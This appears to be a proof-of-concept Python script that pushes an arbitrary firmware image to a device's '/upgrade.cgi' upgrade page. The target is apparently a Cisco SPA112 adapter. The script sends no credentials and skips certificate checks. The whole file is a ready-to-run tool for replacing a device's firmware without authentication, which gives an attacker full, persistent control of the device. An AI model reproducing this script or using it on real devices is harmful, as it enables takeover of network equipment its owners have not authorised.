#!/usr/bin/env python3
import requests
import sys

def upload_firmware(base_url, firmware):
    data = {'submit_button': 'Upgrade',
            'change_action': '',
            'submit_type': '',
            'upgradeflag': 1,
            'closeflg': 1,
            'privilege_str': '',
            'privilege_end': ''
    }
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36',
               'Connection': 'close'}
    files = {'file': ('fw.bin', open(firmware, 'rb'), 'application/binary')}
    upgrade_url = f'{base_url}/upgrade.cgi'
    try:
        print(f'Base URL: {base_url}')
        print(f'Upgrade URL: {upgrade_url}')
        print(f'Firmware File: {firmware}')
        print('Sending firmware update...')
        r = requests.post(upgrade_url, data=data, files=files, verify=False)
        if "is successful" in r.text:
            print('Firmware upgrade successful. Device will reboot eventually and be running the new FW.')
        else:
            print('Did not get the expected glorious success. Dumping response.')
            print(r.text)
    except Exception as e:
        print('Did not get the expected glorious success as we hit an exception. Dumping the exception..')
        print('Note: if your firmware binary was bad/malformed, this happens. The device will reboot anyway.')
        print(str(e))

def main():
    if len(sys.argv) != 3:
        sys.exit(f'use: {sys.argv[0]} http://spa112.lol firmware.bin')
    upload_firmware(sys.argv[1], sys.argv[2])

if __name__ == "__main__":
    main()
